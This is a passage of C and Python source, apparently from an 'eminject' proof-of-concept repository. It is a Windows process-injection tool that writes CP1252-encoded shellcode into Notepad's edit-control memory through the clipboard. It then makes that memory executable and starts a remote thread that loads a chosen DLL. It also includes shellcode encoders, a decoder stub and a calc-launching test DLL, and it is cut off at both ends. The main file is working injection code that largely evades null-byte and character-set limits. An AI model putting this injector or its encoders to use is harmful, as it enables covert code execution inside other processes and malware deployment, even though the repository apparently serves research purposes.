  /* 0000 */ "\x6a\x00"             /* push 0                */
  /* 0002 */ "\x54"                 /* push rsp              */
  /* 0003 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0006 */ "\x5f"                 /* pop  rdi              */
  /* 0007 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
};

// Load an 8-Bit immediate value into AH
#define LOAD_BYTE_SIZE 5

char LOAD_BYTE[] = {
  /* 0000 */ "\xb8\x00\xff\x00\x4d" /* mov   eax, 0x4d00ff00 */
};

// Subtract 32 from AH
#define SUB_BYTE_SIZE 8

char SUB_BYTE[] = {
  /* 0000 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
  /* 0003 */ "\x2d\x00\x20\x00\x4d" /* sub   eax, 0x4d002000 */
};

// Store AH in buffer and advance RDI by 1
#define STORE_BYTE_SIZE 9

char STORE_BYTE[] = {
  /* 0000 */ "\x00\x27"             /* add   byte [rdi], ah  */
  /* 0002 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
  /* 0005 */ "\xae"                 /* scasb                 */
  /* 0006 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
};

// Load the address of DLL into RCX and RDI
#define LOAD_DLL_SIZE 12

char LOAD_DLL[] = {
  /* 0000 */ "\x59"                 /* pop  rcx              */
  /* 0001 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0004 */ "\x51"                 /* push rcx              */
  /* 0005 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0008 */ "\x5f"                 /* pop  rdi              */
  /* 0009 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
};

// Increment RDI
#define INC_RDI_SIZE 4

char INC_RDI[] = {
  /* 0000 */ "\xae"                 /* scasb                 */
  /* 0001 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
};

// Store two null bytes
#define STORE_NULL_SIZE 8

char STORE_NULL[] = {
  /* 0000 */ "\xaa"                 /* stosb                 */
  /* 0001 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
  /* 0004 */ "\xaa"                 /* stosb                 */
  /* 0005 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
};

#define EM_END_SIZE 2

char EM_END[] = {
  /* 0000 */ "\xc3"                 /* ret                   */
  /* 0001 */ "\x00"                 /* required for DLL      */
};

// only useful for CP_ACP codepage
int is_allowed(int ch) {
    if(ch >= 0x80 && ch <= 0x8C) return 0;
    if(ch >= 0x91 && ch <= 0x9C) return 0;
    return (ch != 0x8E && ch != 0x9E && ch != 0x9F);
}

int store_addr(const char *s, void *out, w64_t *addr, int dll_len) {
    int     i;
    uint8_t *ptr = (uint8_t*)out;
    
    //printf("Storing address of %s : %p\n", s, addr->p);
        
    // initialize new address
    memcpy(ptr, STORE_ADR_INIT, STORE_ADR_INIT_SIZE);
    ptr += STORE_ADR_INIT_SIZE;
    
    // for six bytes of a 48-Bit address
    for(i=0; i<6; i++) {
      // load a byte
      memcpy(ptr, LOAD_BYTE, LOAD_BYTE_SIZE);
      ptr[2] = addr->b[i];
    
      // if not allowed for CP_ACP, add 32
      if(!is_allowed(ptr[2])) {
        ptr[2] += 32;
        // subtract 32 from byte at runtime
        memcpy(&ptr[LOAD_BYTE_SIZE], SUB_BYTE, SUB_BYTE_SIZE);
        ptr += SUB_BYTE_SIZE;
      }
      ptr += LOAD_BYTE_SIZE;
      memcpy(ptr, STORE_BYTE, STORE_BYTE_SIZE);
      ptr += STORE_BYTE_SIZE;
    }
    // pop address into RCX and RDI?
    if(dll_len != 0) {
      memcpy(ptr, LOAD_DLL, LOAD_DLL_SIZE);
      ptr += LOAD_DLL_SIZE;
      for(i=0; i<dll_len*2; i++) {
        memcpy(ptr, INC_RDI, INC_RDI_SIZE);
        ptr += INC_RDI_SIZE;
      }
      memcpy(ptr, STORE_NULL, STORE_NULL_SIZE);
      ptr += STORE_NULL_SIZE;
    }
    // return length of code added
    return (int)(ptr - (uint8_t*)out); 
}

// return the amount of code required to load an address
int get_addr_len(w64_t *addr, int dll_len) {
    int i, len=STORE_ADR_INIT_SIZE;
    
    // pop address into RCX and RDI?
    if(dll_len != 0) {
      len += LOAD_DLL_SIZE + STORE_NULL_SIZE;
      len += ((dll_len * 2) * INC_RDI_SIZE);
    }
    // for a 48-bit address
    for(i=0; i<6; i++) {
      // if byte is not allowed
      if(!is_allowed(addr->b[i])) {
        // add length for sub byte
        len += SUB_BYTE_SIZE;
      }
      // add length for load + store
      len += LOAD_BYTE_SIZE;
      len += STORE_BYTE_SIZE;
    }
    return len;
}

void *build_shellcode(w64_t *emaddr, int dll_len, int *outlen) 
{
    int     unilen, cslen, padlen;
    uint8_t *uni, *cs;
    w64_t   loadlib, rtlexit, dlladdr;
    HMODULE m;
    
    // resolve address of exit API    
    m = GetModuleHandle("ntdll");
    rtlexit.p = (void*)GetProcAddress(m, "RtlExitUserThread");
    
    // resolve address of load API
    m = GetModuleHandle("kernelbase");    
    loadlib.p = (void*)GetProcAddress(m, "LoadLibraryW");
    
    // calculate the length of buffer required
    unilen = EM_INIT_SIZE + EM_END_SIZE;
    unilen += get_addr_len(&rtlexit, 0);
    unilen += get_addr_len(&loadlib, 0);
    
    // For the offset of DLL path, we allow the maximum size
    // of code, and if required, simply pad out the remainder 
    // of buffer at the end.
    //
    // We could just do that for all the addresses, but I'm trying
    // to minimize the final size just a bit.
    unilen += (STORE_ADR_INIT_SIZE + 
      LOAD_DLL_SIZE + (2*dll_len * INC_RDI_SIZE) + STORE_NULL_SIZE +
      (6 * (LOAD_BYTE_SIZE + SUB_BYTE_SIZE + STORE_BYTE_SIZE)));
    
    // align up by 2 bytes
    unilen = (unilen + 1) & -2;

    cs = uni = (uint8_t*)calloc(sizeof(wchar_t), unilen);
    if(uni == NULL) { 
      printf("calloc(%i) failed.\n", unilen); 
      return NULL;
    }
    
    // store initialization code
    memcpy(cs, EM_INIT, EM_INIT_SIZE);
    cs += EM_INIT_SIZE;
    
    // store address of API to invoke
    cs += store_addr("RtlExitUserThread", cs, &rtlexit, 0);
    cs += store_addr("LoadLibraryW", cs, &loadlib, 0);
    
    // store address of DLL path
    dlladdr.q = (emaddr->q + unilen);
    cs += store_addr("DLL path", cs, &dlladdr, dll_len);
    
    // store end code
    memcpy(cs, EM_END, EM_END_SIZE);
    cs += EM_END_SIZE;
    
    // pad the buffer
    cslen = (int)(cs - uni);
    padlen = unilen - cslen;
    
    while(padlen--) {
      *cs++ = 0x4D; *cs++ = 0x00;
    }
    // show what we have 
    printf("\n\n");
    printf("Buffer Size       : %" PRId32 "\n", unilen);
    printf("Code Size         : %" PRId32 "\n", cslen);
    printf("EM Buffer         : %p\n", emaddr->p);
    printf("RtlExitUserThread : %p\n", rtlexit.p);
    printf("LoadLibraryW      : %p\n", loadlib.p);
    printf("DLL Offset        : %" PRIx64 "\n", dlladdr.q - emaddr->q);
    
    *outlen = unilen;
    return uni;
}

BOOL CopyData(UINT format, void *data, int cch) {
    LPTSTR  str; 
    HGLOBAL gmem;
    BOOL    bResult = FALSE;
    HANDLE  hcb;
    
    if(!OpenClipboard(NULL)) {
      printf("unable to open clipboard.\n");
      return FALSE;
    }
    
    if(!EmptyClipboard()) {
      printf("unable to empty clipboard.\n");
      goto exit_copy;
    }
      
    gmem = GlobalAlloc(GMEM_MOVEABLE | GMEM_ZEROINIT, (cch + 8));
    if(gmem == NULL) {
      printf("unable to allocate memory.\n");
      goto exit_copy;
    }
    
    str = GlobalLock(gmem); 
    if(str == NULL) {
      printf("GlobalLock failed.\n");
      goto exit_copy;
    }
    
    CopyMemory(str, data, cch); 
    GlobalUnlock(gmem);
    hcb = SetClipboardData(format, gmem);
    bResult = (hcb != NULL);
    GlobalFree(gmem);
exit_copy:
    CloseClipboard();
    return bResult;
}
// EM_SETAUTOCORRECTPROC 
BOOL CALLBACK EnumThreadWnd(HWND hwnd, LPARAM lParam) {
    char cls[MAX_PATH];
    HWND hw=NULL, *out = (HWND*)lParam;
    
    GetClassName(hwnd, cls, MAX_PATH);
    
    // Rich edit controls do not store text as a simple array of characters.
    if(!lstrcmp(cls, "Notepad")) {
      hw = FindWindowEx(hwnd, NULL, "Edit", NULL);
      if(hw != NULL) {
        *out = hw;
        return FALSE;
      }
    }
    return TRUE;
}

#define WORDPAD "C:\\Program Files\\Windows NT\\Accessories\\wordpad.exe"

int main(int argc, char *argv[]) {
    int                   c, i, dll_len, asc_len, cs_len;
    uint8_t               *emh, *cs, *asc, buf[4096];
    DWORD                 pid, old;
    SIZE_T                rd;
    HWND                  hw=NULL, pw;
    CLIENT_ID             cid;
    HANDLE                ss, ht;
    RtlCreateUserThread_t rtlcreate;
    w64_t                 embuf, lastbuf, wrap;
    HMODULE               m;
    PCHAR                 dll_path;
    STARTUPINFO           si;
    PROCESS_INFORMATION   pi;
    THREADENTRY32         te;
    INPUT                 ip;
    
    if(argc != 2) {
      printf("usage: em_inject <full path of DLL to inject>\n");
      return 0;
    }
    
    dll_path = argv[1];
    dll_len  = (int)strlen(argv[1]);
    
    // create host process
    // wait some time for process to fully initialize
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    
    CreateProcess(NULL, "notepad", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    Sleep(WAIT_TIME);
    
    EnumThreadWindows(pi.dwThreadId, EnumThreadWnd, (LPARAM)&hw);
    
    if(hw == NULL) {
      printf("unable to obtain the window handle.\n");
      goto cleanup;
    }
    printf("\nWindow Handle     : %p\n", (PVOID)hw);
    
    emh = (void*)SendMessage(hw, EM_GETHANDLE, 0, 0); 
    if(emh == NULL) {
      printf("Window has no EM handle.\n");
      goto cleanup;
    }
    
    // loop until buffer is stable
    cs = lastbuf.p = NULL;
    
    for(;;) {
      // read the memory handle and buffer
      emh = (void*)SendMessage(hw, EM_GETHANDLE, 0, 0);        
      ReadProcessMemory(pi.hProcess, emh, &embuf.p, sizeof(ULONG_PTR), &rd);
      
      // if this is the same as the last one, end the loop
      if(embuf.p == lastbuf.p) break;
      
      // save this address
      lastbuf.p = embuf.p;
      
      // release memory from last build
      free(cs);
      
      // build the shellcode
      cs = build_shellcode(&embuf, dll_len, &cs_len);
    
      // convert to ASCII and concat the DLL path
      asc_len = (cs_len/2) + dll_len + 1;
      asc = calloc(sizeof(char), asc_len);
      for(i=0; i<cs_len; i+=2) asc[i/2] = cs[i];
    
      // add the DLL path
      strcat((char*)asc, dll_path);
    
      // clear the contents of buffer
      SendMessage(hw, EM_SETSEL, 0, -1);
      SendMessage(hw, WM_CLEAR, 0, 0);
    
      // copy code to remote processs via clipboard
      // wait some time after copying data to clipboard
      CopyData(CF_TEXT, asc, asc_len);
      Sleep(WAIT_TIME);
      
      // wait more time to allow notepad to receive the data
      SendMessage(hw, WM_PASTE, 0, 0);
      Sleep(WAIT_TIME);
      
      free(asc);
    }
    
    // set page to RWX
    VirtualProtectEx(pi.hProcess, embuf.p, 4096, PAGE_EXECUTE_READWRITE, &old);
    
    m = GetModuleHandle("ntdll");
    rtlcreate = (RtlCreateUserThread_t)GetProcAddress(m, "RtlCreateUserThread");
    
    printf("Creating new thread...\n");
    
    // execute shellcode
    rtlcreate(pi.hProcess, NULL, FALSE, 0, NULL, 
      NULL, embuf.p, NULL, &ht, &cid);
    
    // wait for thread to finish
    WaitForSingleObject(ht, INFINITE);
    
    // clear the contents of buffer
    SendMessage(hw, EM_SETSEL, 0, -1);
    SendMessage(hw, WM_CLEAR, 0, 0);
    
    printf("Press any key to continue...\n");
    getchar();
    
    // set page back to RW
    VirtualProtectEx(pi.hProcess, embuf.p, 4096, old, &old);
    
    free(cs);
cleanup:
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}

```

`eminject/test_code/encode.c`:

```c
//
// odzhan, june 2020
//

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <inttypes.h>
#include <limits.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef union _w64_t {
    u8   b[8];
    u16  h[4];
    u32  w[2];
    u64  q;
    void *p;
} w64_t;

#define CP1252_KEY  0x4D
#define CP1252_FILE "cp1252.bin"
#define MAX_ADDR 6

// This decoder is compatible with x86 and amd64
#define CP1252_DECODER_SIZE 40

char CP1252_DECODER[] = {
  /* 0000 */ "\xeb\x21"             /* jmp   0x23     */
  /* 0002 */ "\xac"                 /* lodsb          */
  /* 0003 */ "\xfe\xc8"             /* dec   al       */
  /* 0005 */ "\x75\x04"             /* jne   0xb      */
  /* 0007 */ "\xac"                 /* lodsb          */
  /* 0008 */ "\xac"                 /* lodsb          */
  /* 0009 */ "\x34\x4d"             /* xor   al, 0x4d */
  /* 000B */ "\xaa"                 /* stosb          */
  /* 000C */ "\xac"                 /* lodsb          */
  /* 000D */ "\xe2\xf3"             /* loop  2        */
  /* 000F */ "\xc3"                 /* ret            */
  
  /* 0010 */ "\x5e"                 /* pop   rsi      */
  /* 0011 */ "\x6a\x01"             /* push  1        */
  /* 0013 */ "\x54"                 /* push  rsp      */
  /* 0014 */ "\x5f"                 /* pop   rdi      */
  /* 0015 */ "\x6a\x04"             /* push  4        */
  /* 0017 */ "\x59"                 /* pop   rcx      */
  /* 0018 */ "\xe8\xe5\xff\xff\xff" /* call  2        */
  /* 001D */ "\x59"                 /* pop   rcx      */
  /* 001E */ "\x56"                 /* push  rsi      */
  /* 001F */ "\x5f"                 /* pop   rdi      */
  /* 0020 */ "\x56"                 /* push  rsi      */
  /* 0021 */ "\xeb\xdf"             /* jmp   2        */
  /* 0023 */ "\xe8\xe8\xff\xff\xff" /* call  0x10     */
};

// with the current size of decoder, this takes  up 380 bytes
// store a 32-bit word in buffer EDI/RDI holds
#define STORE_WORD_SIZE 38

char STORE_WORD[] = {
  /* 0000 */ "\x68\x00\x03\x00\x01" /* push  0x1000300       */
  /* 0005 */ "\x00\x4d\x00"         /* add   byte [ebp], cl  */
  /* 0008 */ "\x54"                 /* push  esp             */
  /* 0009 */ "\x00\x4d\x00"         /* add   byte [ebp], cl  */
  /* 000C */ "\x58"                 /* pop   eax             */
  /* 000D */ "\x00\x4d\x00"         /* add   byte [ebp], cl  */
  /* 0010 */ "\xc1\x00\x08"         /* rol   dword [eax], 8  */
  /* 0013 */ "\x00\x4d\x00"         /* add   byte [ebp], cl  */
  /* 0016 */ "\x58"                 /* pop   eax             */
  /* 0017 */ "\x00\x4d\x00"         /* add   byte [ebp], cl  */
  /* 001A */ "\x35\x00\x02\x00\x04" /* xor   eax, 0x4000200  */
  /* 001F */ "\x00\x4d\x00"         /* add   byte [ebp], cl  */
  /* 0022 */ "\xab"                 /* stosd                 */
  /* 0023 */ "\x00\x4d\x00"         /* add   byte [ebp], cl  */
};

// Initialize RBP for writing
#define CP1252_PROLOG_SIZE 4

char CP1252_PROLOG[] = {
  /* 0000 */ "\xc8\x00\x01\x00"     /* enter 0x100, 0        */
};

// Allocate 64-bit buffer on stack and place address in RDI for writing
#define STORE_ADDR_SIZE 10

char STORE_ADDR[] = {
  /* 0000 */ "\x6a\x00"             /* push 0                */
  /* 0002 */ "\x54"                 /* push rsp              */
  /* 0003 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0006 */ "\x5f"                 /* pop  rdi              */
  /* 0007 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
};

// Load an 8-Bit immediate value into AH
#define LOAD_BYTE_SIZE 5

char LOAD_BYTE[] = {
  /* 0000 */ "\xb8\x00\xff\x00\x4d" /* mov   eax, 0x4d00ff00 */
};

// Subtract 32 from AH
#define SUB_BYTE_SIZE 8

char SUB_BYTE[] = {
  /* 0000 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
  /* 0003 */ "\x2d\x00\x20\x00\x4d" /* sub   eax, 0x4d002000 */
};

// Store AH in buffer and advance RDI by 1
#define STORE_BYTE_SIZE 9

char STORE_BYTE[] = {
  /* 0000 */ "\x00\x27"             /* add   byte [rdi], ah  */
  /* 0002 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
  /* 0005 */ "\xae"                 /* scasb                 */
  /* 0006 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
};

// Store address on the stack in RDI
#define POP_DI_SIZE 4

char POP_DI[] = {
  /* 0000 */ "\x5f"                 /* pop   rdi             */
  /* 0001 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
};

// Store address in RDI on the stack
#define PUSH_DI_SIZE 4

char PUSH_DI[] = {
  /* 0000 */ "\x57"                 /* push  rdi             */
  /* 0001 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
};

#define CP1252_EPILOG_SIZE 36

char CP1252_EPILOG[] = {
  /* 0000 */ "\x5a"                 /* pop  rdx              */
  /* 0001 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0004 */ "\x55"                 /* push rbp              */
  /* 0005 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0008 */ "\x54"                 /* push rsp              */
  /* 0009 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 000C */ "\x5f"                 /* pop  rdi              */
  /* 000D */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0010 */ "\xb8\x00\x08\x00\x4d" /* mov  eax, 0x4d000800  */
  /* 0015 */ "\x00\x27"             /* add  byte [rdi], ah   */
  /* 0017 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 001A */ "\x5c"                 /* pop  rsp              */
  /* 001B */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 001E */ "\x52"                 /* push rdx              */
  /* 001F */ "\x00\x45\x00"         /* add  byte [rbp], al   */
  /* 0022 */ "\xc3"                 /* ret                   */
  /* 0024 */ "\x00"
};

// only useful for CP_ACP codepage
static
int is_cp1252_allowed(int ch) {
    if(ch >= 0x80 && ch <= 0x8C) return 0;
    if(ch >= 0x91 && ch <= 0x9C) return 0;
    
    return (ch != 0x8E && ch != 0x9E && ch != 0x9F);
}

// determines if byte is compatible with CP1252 encoding
// and the CP1252 decoder using escape codes
static
int is_decoder_allowed(u8 ch) {
    // check for null byte and escape code
    if(ch == 0 || ch == 1) return 0;
    
    return is_cp1252_allowed(ch);
}

static
int cp1252_encode_data(
  void *outbuf, int ofs, 
  const void *inbuf, int inlen) 
{
    u8  c, *in=NULL, *out=NULL;
    int outlen = 0;
    
    in  = (u8*)inbuf;
    out = (u8*)outbuf + ofs;
    
    while(inlen--) {
      // read byte
      c = *in++;
      // is the result compatible with CP1252 decoder?
      if(!is_decoder_allowed(c + 1)) {
        // no. write escape sequence
        if(outbuf != NULL) *out++ = 1;
        outlen++;
        // XOR the result with 8-bit key
        if(outbuf != NULL) *out++ = c ^ CP1252_KEY;
        outlen++;
      } else {
        // yes. save byte plus 1
        if(outbuf != NULL) *out++ = c + 1;  
        outlen++;
      }
    }
    // return number of bytes processed
    return outlen;
}

// encode the contents of a file that when converted to the CP1252
// character set can be decoded using the CP1252_DECODER
static
void *cp1252_encode_file(const char *infile, int *outlen) {
    struct stat fs;
    FILE        *in;
    int         inlen, buflen;
    void        *inbuf=NULL, *outbuf=NULL;
     
    if(stat(infile, &fs)) return NULL;
    in = fopen(infile, "rb");
    if(in == NULL) return NULL;
    inlen = fs.st_size;
    inbuf = malloc(inlen);
    
    if(inbuf != NULL) {
      // read the data to encode
      fread(inbuf, sizeof(char), inlen, in);
      
      // calculate the size of memory required
      buflen = cp1252_encode_data(NULL, 0, &inlen, sizeof(u32));
      buflen += cp1252_encode_data(NULL, buflen, inbuf, inlen);
      
      if(buflen != 0) {
        // add space for decoder
        buflen += (CP1252_DECODER_SIZE / 2);
        // allocate memory
        outbuf = malloc(buflen);
        if(outbuf != NULL) {
          // initialize to key
          memset(outbuf, CP1252_KEY, buflen);
          *outlen = (CP1252_DECODER_SIZE / 2);
          // encode, then store the length and data
          *outlen += cp1252_encode_data(
            outbuf, *outlen, 
            &inlen, sizeof(u32));
            
          *outlen += cp1252_encode_data(
            outbuf, *outlen, 
            inbuf, inlen);
        }
      }
      free(inbuf);
    }
    fclose(in);
    
    return outbuf;
}

// Convert executable code to CP1252 compatible code.
// The code will generate the original before executing.
// 
static
int cp1252_generate_decoder(
  const void *addrbuf, void *outbuf, 
  const char *inbuf, u32 inlen) 
{
    int     i, max_addr;
    u8 *out = (u8*)outbuf, 
            *in = (u8*)inbuf,
            *addr = (u8*)addrbuf;
    
    memcpy(out, CP1252_PROLOG, CP1252_PROLOG_SIZE);
    out += CP1252_PROLOG_SIZE;
    
    // copy the destination address to DI
    memcpy(out, STORE_ADDR, STORE_ADDR_SIZE);
    out += STORE_ADDR_SIZE;
    
    // the max address for virtual memory on 
    // windows is (2 ^ 47) - 1 or 0x7FFFFFFFFFFF

    // ***********************************
    // store address
    for(i=0; i<MAX_ADDR; i++) {      
      // load a byte
      memcpy(out, LOAD_BYTE, LOAD_BYTE_SIZE);
      out[2] = addr[i];
    
      // if not allowed for CP1252, add 32
      if(!is_cp1252_allowed(out[2])) {
        out[2] += 32;
        // subtract 32 from byte at runtime
        memcpy(&out[LOAD_BYTE_SIZE], SUB_BYTE, SUB_BYTE_SIZE);
        out += SUB_BYTE_SIZE;
      }
      out += LOAD_BYTE_SIZE;
      memcpy(out, STORE_BYTE, STORE_BYTE_SIZE);
      out += STORE_BYTE_SIZE;
    }
    
    // pop address into DI
    memcpy(out, POP_DI, POP_DI_SIZE);
    out += POP_DI_SIZE;
    
    // save address on the stack
    memcpy(out, PUSH_DI, PUSH_DI_SIZE);
    out += PUSH_DI_SIZE;
    
    // ***********************************
    // copy the code to buffer
    for(i=0; i<inlen; i++) {
      // load a byte
      memcpy(out, LOAD_BYTE, LOAD_BYTE_SIZE);
      out[2] = in[i];
      // subtract key for every 2 bytes
      if((i & 1)==0) out[2] -= CP1252_KEY;
    
      // if disallowed for CP1252
      if(!is_cp1252_allowed(out[2])) {
        // add 32
        out[2] += 32;
        // and subtract 32 from the byte at runtime
        memcpy(&out[LOAD_BYTE_SIZE], SUB_BYTE, SUB_BYTE_SIZE);
        out += SUB_BYTE_SIZE;
      }
      out += LOAD_BYTE_SIZE;
      memcpy(out, STORE_BYTE, STORE_BYTE_SIZE);
      out += STORE_BYTE_SIZE;
    }
    
    // add epilog code
    memcpy(out, CP1252_EPILOG, CP1252_EPILOG_SIZE);
    out += CP1252_EPILOG_SIZE;
    
    // return length of constructed code
    return (int)(out - (u8*)outbuf); 
}

static
int cp1252_max_loader_size(int inlen) {
    int outlen;
    
    outlen = CP1252_PROLOG_SIZE + STORE_ADDR_SIZE;
    outlen += (LOAD_BYTE_SIZE * (inlen + MAX_ADDR));
    outlen += (SUB_BYTE_SIZE * (inlen + MAX_ADDR));
    outlen += (STORE_BYTE_SIZE * (inlen + MAX_ADDR));
    outlen += POP_DI_SIZE;
    outlen += PUSH_DI_SIZE;
    outlen += CP1252_EPILOG_SIZE;
    
    // align up by 2 bytes (it should be already anyway)
    return (outlen + 1) & -2;
}

// Create a CP1252 compatible loader
static
void *cp1252_build_loader(w64_t *addr, int dslen, int *cslen) {
    void  *outbuf = NULL;
    int   maxlen, outlen;
    w64_t ofs;
    
    maxlen = cp1252_max_loader_size(CP1252_DECODER_SIZE);
    outbuf = malloc(maxlen);
    
    if(outbuf != NULL) {
      memset(outbuf, CP1252_KEY, maxlen);
      
      // calculate offset of where loader should be stored
      ofs.q = addr->q + maxlen;
 
      *cslen = cp1252_generate_decoder(
        &ofs.p, outbuf, CP1252_DECODER, CP1252_DECODER_SIZE);

      *cslen = maxlen;
    }
    return outbuf;
}

// you can only test this on Windows
#ifdef TEST
#include <windows.h>

int main(int argc, char **argv) {
    int     i, dslen, cslen, vmlen, uni_len, asc_len;
    void    *ds, *cs, *code;
    w64_t   vm;
    u8 *out, *ptr, *asc;
    HANDLE  ht;
    
    // convert the user-supplied shellcode to CP1252 encoded data
    if((ds = cp1252_encode_file(argv[1], &dslen)) != NULL) {
      vmlen = dslen + 0xFFFF;
      
      vm.p = VirtualAlloc(
        NULL, vmlen, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE);
        
      // convert the CP1252 decoder to CP1252 compatible code
      // we need a destination address for this
      if((cs = cp1252_build_loader(&vm, dslen, &cslen))) {
        
        FILE *bin = fopen("unicode.bin", "wb");
        fwrite(cs, 1, cslen, bin);
        fclose(bin);
        
        // convert the loader to ascii
        asc_len = cslen;
        asc_len += dslen;
        
        out = asc = malloc(asc_len + 1);
        ptr = (u8*)cs;
        for(i=0; i<cslen; i+=2) {
          *out++ = *ptr++;
          ptr++;
        }
        // copy the encoded data
        memcpy(out, ds, dslen);
        
        bin = fopen("code.bin", "wb");
        fwrite(asc, 1, asc_len, bin);
        fclose(bin);
        
        // convert to unicode using CP_ACP
        uni_len = MultiByteToWideChar(CP_ACP, 0, asc, asc_len, (LPWSTR)vm.p, vmlen);
        
        bin = fopen("convert.bin", "wb");
        fwrite(vm.p, 1, uni_len, bin);
        fclose(bin);
        
        printf("CP1252 encoded length : %i\n", uni_len);
        printf("Thread will execute at %p\n", vm.p);
        getchar();
        
        ht = CreateThread(NULL, 0, vm.p, NULL, 0, NULL);
        WaitForSingleObject(ht, INFINITE);
        
        /**
        // copy the loader
        out = (u8*)vm.p;
        CopyMemory(out, cs, cslen);
        out += cslen;
        
        // copy the data as CP1252
        ptr = (u8*)ds;
        for(i=0; i<dslen; i++) {
          *out++ = *ptr++;
          *out++ = 0;
        }
        printf("Thread will execute at %p\n", vm.p);
        getchar();
        
        ht = CreateThread(NULL, 0, vm.p, NULL, 0, NULL);
        WaitForSingleObject(ht, INFINITE);*/
        
        free(cs);
      }
      free(ds);
      VirtualFree(vm.p, 0,  MEM_RELEASE);
    }
    return 0;
}

#endif
```

`eminject/test_code/five.py`:

```py
# test1.py
from capstone import *
import array

md = Cs(CS_ARCH_X86, CS_MODE_64)
cs = bytearray(b'\x00\x00\x00\x00\x00\x00')

def allowed(ch):
  if(ch >= 0x80 and ch <= 0x8C):
    return False
  if(ch >= 0x91 and ch <= 0x9C):
    return False
  if(ch == 0x8E or ch == 0x9E or ch == 0x9F):
    return False
  return True
  
for i in range(0, 256):
  if not allowed(i): 
    continue
  cs[0] = i
  for j in range(0, 256):
    if not allowed(j):
      continue
    cs[2] = j
    for k in range(0, 256):
      if not allowed(k):
        continue
      cs[4] = k
      for insn in md.disasm(cs, 0):
        if insn.size == 5:
          print(''.join('\\x{:02x}'.format(x) for x in insn.bytes), end='')
          print(" /* %s\t%s */" %(insn.mnemonic, insn.op_str))

```

`eminject/test_code/four.py`:

```py
# test1.py
from capstone import *
import array

md = Cs(CS_ARCH_X86, CS_MODE_64)
cs = bytearray(b'\x00\x00\x00\x00')

def is_allowed(ch):
  if(ch >= 0x80 and ch <= 0x8C):
    return False
  if(ch >= 0x91 and ch <= 0x9C):
    return False
  if(ch == 0x8E or ch == 0x9E or ch == 0x9F):
    return False
  return True
  
for i in range(0, 256):
  if not is_allowed(i): 
    continue
  cs[1] = i
  for j in range(0, 256):
    cs[3] = j
    for insn in md.disasm(cs, 0):
      if insn.size == 4:
        print(''.join('\\x{:02x}'.format(x) for x in insn.bytes), end='')
        print(" /* %s\t%s */" %(insn.mnemonic, insn.op_str))

```

`eminject/test_code/hello.c`:

```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#pragma comment(lib, "user32.lib")

__declspec(dllexport)
BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD ul_reason_for_call,
                      LPVOID lpReserved) {
  switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
      WinExec("calc", SW_SHOW);
      break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
      break;
  }
  return TRUE;
}

```

`eminject/test_code/nullz_encoder.c`:

```c
//
// A simple PoC for the blog post.
// 
// odzhan

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <inttypes.h>
#include <limits.h>

typedef uint8_t u8;
typedef uint32_t u32;

#define NULLZ_KEY  0x4D
#define NULLZ_FILE "nullz.bin"

#define NULLZ_DECODER_SIZE 30

// compatible with x86 and x86-64
char NULLZ_DECODER[] = {
  /* 0000 */ "\xeb\x17"             /* jmp   0x19            */
  /* 0002 */ "\x5e"                 /* pop   esi             */
  /* 0003 */ "\xad"                 /* lodsd                 */
#define NULLZ_LEN 5
  /* 0004 */ "\x35\x78\x56\x34\x12" /* xor   eax, 0x12345678 */
  /* 0009 */ "\x91"                 /* xchg  eax, ecx        */
  /* 000A */ "\x56"                 /* push  esi             */
  /* 000B */ "\x5f"                 /* pop   edi             */
  /* 000C */ "\x56"                 /* push  esi             */
  /* 000D */ "\xac"                 /* lodsb                 */
  /* 000E */ "\xfe\xc8"             /* dec   al              */
  /* 0010 */ "\x75\x03"             /* jne   0x15            */
  /* 0012 */ "\xac"                 /* lodsb                 */
  /* 0013 */ "\x34\x4d"             /* xor   al, 0x4d        */
  /* 0015 */ "\xaa"                 /* stosb                 */
  /* 0016 */ "\xe2\xf5"             /* loop  0xd             */
  /* 0018 */ "\xc3"                 /* ret                   */
  /* 0019 */ "\xe8\xe4\xff\xff\xff" /* call  2               */
};

// create an executable loader
static
void make_loader(size_t inlen, const char *outfile) {
    struct stat fs;
    FILE *in=NULL, *out=NULL;
    void *buf=NULL;
    u8 *ptr;
    u32 key, xlen, outlen;
    
    // read size of file
    if(stat(outfile, &fs) != 0) {perror(outfile); goto make_end;}
    if(fs.st_size == 0) {printf("%s is empty.\n", outfile); goto make_end;}
    
    // allocate memory for decoder + file
